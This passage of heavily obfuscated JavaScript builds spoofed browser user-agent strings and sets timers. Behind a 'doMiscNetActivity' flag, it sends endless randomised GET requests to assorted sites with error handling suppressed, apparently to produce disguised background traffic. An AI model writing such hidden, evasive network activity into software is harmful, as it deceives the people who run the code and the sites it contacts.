      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = 0x25f + 0x22ab + -0x250a; k < -0xff7 + 0x4d9 * 0x7 + -0x11f4; k++)
    setTimeout(f, (-0x17f01 + -0x9037 * -0x2 + 0x148f3) * k * getRandomInt(-0x322 * -0x5 + -0x53 * 0xb + -0xc18, -0x16a * 0x11 + -0x1 * 0x26dd + -0x3eea * -0x1));
  setInterval(() => {
    f();
    for (let l = -0x1 * -0x18ea + 0xe6 * -0x10 + 0x2 * -0x545; l < -0xb76 + 0x2 * 0x2bb + 0x4 * 0x181; l++)
      setTimeout(f, (-0xe0b1 + 0x1 * -0x11d2f + -0x1742 * -0x20) * l * getRandomInt(0x1 * 0x1115 + 0x1246 * -0x1 + 0x6 * 0x33, -0x1ff7 + -0x1 * 0x1123 + -0x105f * -0x3));
  }, -0x1 * -0x6cc47e + 0x6dc1c8 + -0x1 * 0xa397c6);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (-0x14c1 + 0x367e + -0x665 * 0x1) * getRandomInt(-0xe86 + 0xdd * -0x27 + 0x1 * 0x3032, 0x12de + -0x1 * 0x23bf + 0x10e6));
}, -0x6a4 + -0x1 * 0x7db + 0xee3);